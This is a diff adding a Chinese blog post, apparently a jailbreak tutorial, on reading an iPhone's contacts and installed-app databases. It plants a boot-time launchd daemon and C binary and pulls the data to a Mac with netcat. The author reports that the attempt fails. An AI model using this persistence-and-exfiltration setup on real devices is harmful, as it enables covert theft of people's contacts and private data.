@@ -1,0 +1,1634 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》">
+<meta name="keywords" content="iOS,攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用">
+<meta property="og:url" content="https://sevencho.github.io/archives/bf5c1be0.html">
+<meta property="og:site_name" content="曹雪松de博客|CoderBoy&#39;s Blog">
+<meta property="og:description" content="咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png">
+<meta property="og:image" content="https://sevencho.github.io/uploads/assets/hack_appList_result_failed.png">
+<meta property="og:updated_time" content="2018-09-03T03:44:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用">
+<meta name="twitter:description" content="咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》">
+<meta name="twitter:image" content="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="曹雪松de博客|CoderBoy's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://sevencho.github.io/archives/bf5c1be0.html"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用 | 曹雪松de博客|CoderBoy's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">曹雪松de博客|CoderBoy's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">技术宅 iOS开发 美剧控</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives menu-item-active">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />公益</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-categories" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sevencho.github.io/archives/bf5c1be0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="曹雪松">
+      <meta itemprop="description" content="一只特立独行的CoderBoy🐶">
+      <meta itemprop="image" content="/uploads/images/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="曹雪松de博客|CoderBoy's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-05 18:27:45" itemprop="dateCreated datePublished" datetime="2018-07-05T18:27:45+08:00">2018-07-05</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/iOS/" itemprop="url" rel="index"><span itemprop="name">iOS</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/iOS/攻防/" itemprop="url" rel="index"><span itemprop="name">攻防</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">5.9k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">11 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<blockquote>
+<p>咱们应当在一起，否则就太伤天害理啦。</p>
+<p>——王小波《爱你就像爱生命》</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
+<li>通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。</li>
+<li>开启一个Socket通信端口。</li>
+<li>通过使用<code>NetCat</code>将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。</li>
+<li><p>所有资料文件&amp;工具在<a href="https://github.com/SevenCho/BlogRepo" target="_blank" rel="noopener">这里</a></p>
+</li>
+<li><p>了解更多：</p>
+<ul>
+<li><a href="https://sevencho.github.io/archives/e38331a.html">iOS攻防（一）： iPhone手机越狱 &amp; SSH</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="了解一下OS-X的启动原理"><a href="#了解一下OS-X的启动原理" class="headerlink" title="了解一下OS X的启动原理"></a>了解一下OS X的启动原理</h2><ul>
+<li><p>Mac下的启动服务主要有三个地方可配置：</p>
+<ul>
+<li>系统偏好设置-&gt;帐户-&gt;登陆项</li>
+<li><code>/System/Library/StartupItems</code> 和 <code>/Library/StartupItems/</code></li>
+<li><code>launchd</code> 系统初始化进程配置。<ul>
+<li>launchd是Mac OS下，用于初始化系统环境的关键进程。类似Linux下的init, rc。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>启动过程</p>
+<ul>
+<li>mac固件激活，初始化硬件，加载BootX引导器。</li>
+<li>BootX加载内核与内核扩展(kext)。</li>
+<li>内核启动launchd进程。</li>
+<li>launchd根据<ul>
+<li><code>/System/Library/LaunchAgents</code></li>
+<li><code>/System/Library/LaunchDaemons</code></li>
+<li><code>/Library/LaunchDaemons</code></li>
+<li><code>Library/LaunchAgents</code></li>
+<li><code>~/Library/LaunchAgents</code>里的plist配置，启动服务守护进程。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>LaunchDaemons（后台驻留程序启动）是用户未登陆前就启动的服务(守护进程)<br>LaunchAgents（启动代理）是用户登陆后启动的服务(守护进程)</p>
+</blockquote>
+<ul>
+<li>理解几个基础概念：<code>/System/Library</code>和<code>/Library</code>和<code>~/Library</code>目录的区别？<ul>
+<li><code>/System/Library</code>目录是存放Apple自己开发的软件。</li>
+<li><code>/Library</code>目录是系统管理员存放的第三方软件。</li>
+<li><code>~/Library/</code>是用户自己存放的第三方软件。</li>
+</ul>
+</li>
+</ul>
+<h3 id="几个目录下plist文件格式及每个字段的含义："><a href="#几个目录下plist文件格式及每个字段的含义：" class="headerlink" title="几个目录下plist文件格式及每个字段的含义："></a>几个目录下plist文件格式及每个字段的含义：</h3><ul>
+<li>因为iOS和Mac都是基于Unix，所以启动过程基本是类似的。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><center>Key</center></th>
+<th><span class="Apple-tab-span" style="white-space:pre"></span><center>Description</center></th>
+<th><center>Required</center></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Label</td>
+<td>The name of the job</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>ProgramArguments</td>
+<td>Strings to pass to the program when it is executed</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>UserName</td>
+<td>The job will be run as the given user, who may not necessarily be the one who submitted it to launchd.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>inetdCompatibility</td>
+<td>Indicates that the daemon expects to be run as if it were launched by inetd</td>
+<td>no</td>
+</tr>
+<tr>
+<td>Program</td>
+<td>The path to your executable. This key can save the ProgramArguments key for flags and arguments.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>onDemand</td>
+<td>A boolean flag that defines if a job runs continuously or not</td>
+<td>no</td>
+</tr>
+<tr>
+<td>RootDirectory</td>
+<td>The job will be?chrooted?into another directory</td>
+<td>no</td>
+</tr>
+<tr>
+<td>ServiceIPC</td>
+<td>Whether the daemon can speak IPC to launchd</td>
+<td>no</td>
+</tr>
+<tr>
+<td>WatchPaths</td>
+<td>Allows launchd to start a job based on modifications at a file-system path</td>
+<td>no</td>
+</tr>
+<tr>
+<td>QueueDirectories</td>
+<td>Similar to WatchPath, a queue will only watch an empty directory for new files</td>
+<td>no</td>
+</tr>
+<tr>
+<td>StartInterval</td>
+<td>Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>StartCalendarInterval</td>
+<td>Job scheduling. The syntax is similar to cron.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>HardResourceLimits</td>
+<td>Controls restriction of the resources consumed by any job</td>
+<td>no</td>
+</tr>
+<tr>
+<td>LowPriorityIO</td>
+<td>Tells the kernel that this task is of a low priority when doing file system I/O</td>
+<td>no</td>
+</tr>
+<tr>
+<td>Sockets</td>
+<td>An array can be used to specify what socket the daemon will listen on for launch on demand</td>
+<td>no</td>
+</tr>
+</tbody>
+</table>
+<h2 id="配置一个Hack通讯录进程的plist文件"><a href="#配置一个Hack通讯录进程的plist文件" class="headerlink" title="配置一个Hack通讯录进程的plist文件"></a>配置一个Hack通讯录进程的plist文件</h2><ul>
+<li>我们需要通过一个plist文件在系统加载时候启动一个进程。</li>
+<li><p>如：一个名为<code>hack</code>的进程，该进程加载的可执行文件<code>hack</code>的路径是<code>/usr/bin/hack</code>。</p>
+</li>
+<li><p>配置的plist如下：</p>
+</li>
+</ul>
+<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png" alt="hack_plist"></p>
+<ul>
+<li>plist源码如下：<ul>
+<li><code>Program</code> ： 进程可执行文件加载路径</li>
+<li><code>StandardErrorPath</code> ：标准错误路径</li>
+<li><code>ProgramArguments</code> ： 用户登陆后启动的服务路径</li>
+<li><code>inetdCompatibility</code> ：是一个因特网超级服务器(即inetd守护进程）来简化守护进程的编写。</li>
+<li><code>SockServiceName</code> ： Socket通信端口名称</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">   hack.plist</span><br><span class="line"></span><br><span class="line">   Created by 曹雪松 on 2018/7/5.</span><br><span class="line">   Copyright (c) 2018 曹雪松. All rights reserved.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class="line">    &lt;dict&gt;</span><br><span class="line">        &lt;key&gt;Program&lt;/key&gt;</span><br><span class="line">        &lt;string&gt;/usr/bin/hack&lt;/string&gt;</span><br><span class="line">        &lt;key&gt;StandardErrorPath&lt;/key&gt;</span><br><span class="line">        &lt;string&gt;/dev/null&lt;/string&gt;</span><br><span class="line">        &lt;key&gt;SessionCreate&lt;/key&gt;</span><br><span class="line">        &lt;true/&gt;</span><br><span class="line">        &lt;key&gt;ProgramArguments&lt;/key&gt;</span><br><span class="line">        &lt;array&gt;</span><br><span class="line">            &lt;string&gt;/usr/bin/hack&lt;/string&gt;</span><br><span class="line">        &lt;/array&gt;</span><br><span class="line">        &lt;key&gt;inetdCompatibility&lt;/key&gt;</span><br><span class="line">        &lt;dict&gt;</span><br><span class="line">            &lt;key&gt;Wait&lt;/key&gt;</span><br><span class="line">            &lt;false/&gt;</span><br><span class="line">        &lt;/dict&gt;</span><br><span class="line">        &lt;key&gt;Sockets&lt;/key&gt;</span><br><span class="line">        &lt;dict&gt;</span><br><span class="line">            &lt;key&gt;Listeners&lt;/key&gt;</span><br><span class="line">            &lt;dict&gt;</span><br><span class="line">                &lt;key&gt;SockServiceName&lt;/key&gt;</span><br><span class="line">                &lt;string&gt;55&lt;/string&gt;</span><br><span class="line">            &lt;/dict&gt;</span><br><span class="line">        &lt;/dict&gt;</span><br><span class="line">    &lt;/dict&gt;</span><br><span class="line">&lt;/plist&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /Users/sevencho/Desktop/hack.plist root@192.168.1.60:/System/Library/LaunchDaemons/hack.plist</span><br></pre></td></tr></table></figure>
+<h2 id="读取通讯录-amp-用户安装App列表-的执行程序"><a href="#读取通讯录-amp-用户安装App列表-的执行程序" class="headerlink" title="读取通讯录 &amp; 用户安装App列表 的执行程序"></a>读取通讯录 &amp; 用户安装App列表 的执行程序</h2><ul>
+<li>我们只要能拿出AddressBook.sqlitedb/itunesstored2.sqlitedb就可以拿到用户的数据。<ul>
+<li>AddressBook的数据都在<code>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</code>中，</li>
+<li>iTunes Store的数据都在<code>/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb</code>中，</li>
+</ul>
+</li>
+<li>写一个函数用于读取用户通讯录数据库或者用户安装App列表。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  hack.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by 曹雪松 on 2018/7/5.</span></span><br><span class="line"><span class="comment">//  Copyright © 2018 曹雪松. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE <span class="meta-string">"/var/mobile/Library/AddressBook/AddressBook.sqlitedb"</span> <span class="comment">// 手机的通讯录数据库路径</span></span></span><br><span class="line"><span class="comment">// #define FILE "/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb" // 用户安装app列表文件</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(FILE, O_RDONLY); <span class="comment">// 读数据库文件，返回文件句柄标识</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (( ret = read(fd, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>)&#123; <span class="comment">// 将文件读进buff中</span></span><br><span class="line">        write( fileno(<span class="built_in">stdout</span>), buf, ret); <span class="comment">// 写到标准输出中</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>生成可执行文件<ul>
+<li>在<code>hack.c</code>所在目录执行，也可以直接指定文件路径</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcrun -sdk iphoneos clang -arch armv7s -o hack hack.c</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可执行文件签名，并传输至iPhone手机<code>/usr/bin</code>目录</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldid -S hack</span><br><span class="line">scp hack root@192.168.1.60:/usr/bin/hack</span><br></pre></td></tr></table></figure>
+<ul>
+<li>新开一个终端，SSH连接手机。</li>
+</ul>
+<h2 id="获取AddressBook-amp-用户安装App列表数据"><a href="#获取AddressBook-amp-用户安装App列表数据" class="headerlink" title="获取AddressBook &amp; 用户安装App列表数据"></a>获取AddressBook &amp; 用户安装App列表数据</h2><ul>
+<li>利用<code>netcat</code>，将指定服务端口的数据以文件的形式传输到电脑的当前目录下，抓取设备 <code>AddressBook</code> 或者 用户安装App列表信息。</li>
+<li><code>55</code>为之前plist文件配置的Socket服务名称。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 根据自己可执行程序路径，选择获取的数据类型</span><br><span class="line">nc 192.168.1.60 55 &gt; addressBook.sqlitedb  // 通讯录</span><br><span class="line">nc 192.168.1.60 55 &gt; itunesstored2.sqlitedb // App列表</span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用<code>netcat</code>获取的<code>addressBook.sqlitedb</code>是空的。</li>
+<li>使用如下指令监控下过程提示连接拒绝，但是<code>192.168.1.60</code>是可以<code>ping</code>通的。</li>
+<li>使用<code>ps aux</code>指令查看所有启动的进程，貌似没有找到我们的<code>hack</code>进程。<ul>
+<li>暂时还没有找到解决方法，大家可以一起帮忙排查原因。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.1.60 55</span><br><span class="line">// nc: connectx to 192.168.1.60 port 55 (tcp) failed: Connection refused</span><br></pre></td></tr></table></figure>
+<center><img src="/uploads/assets/hack_appList_result_failed.png" alt="hack_appList_result_failed"></center>
+
+
+<ul>
+<li>如果文件有数据，可以使用<code>string</code>命令查看文件内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings itunesstored2.sqlitedb</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://zhoulingyu.com/2016/07/12/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E8%AE%AF%E5%BD%95%E4%BF%A1%E6%81%AF/" target="_blank" rel="noopener">iOS攻防——（二）如何窃取用户的通讯录信息</a></li>
+<li><a href="https://blog.csdn.net/abby_sheen/article/details/7794531" target="_blank" rel="noopener">Mac OS启动服务</a></li>
+<li><a href="https://www.cnblogs.com/klcf0220/p/3611836.html" target="_blank" rel="noopener">守护进程和inetd超级服务器</a></li>
+<li><a href="https://blog.csdn.net/qq_21792169/article/details/51068796" target="_blank" rel="noopener">C语言之fileno()函数</a></li>
+<li><a href="https://blog.csdn.net/u012349696/article/details/51125106" target="_blank" rel="noopener">对stdin，stdout 和STDOUT_FILENO，STDIN_FILENO的学习</a></li>
+<li><a href="https://www.cnblogs.com/wenbiao/p/3375811.html" target="_blank" rel="noopener">nc命令详解</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>要不要鼓励一下😘</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/uploads/images/wechat-reward-image.JPG" alt="曹雪松 微信"/>
+        <p>微信</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/uploads/images/alipay-reward-image.JPG" alt="曹雪松 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>曹雪松</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://sevencho.github.io/archives/bf5c1be0.html" title="iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用">https://sevencho.github.io/archives/bf5c1be0.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 CC BY-NC-SA 3.0 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/iOS/" rel="tag"><i class="fa fa-tag"></i> iOS</a>
+          
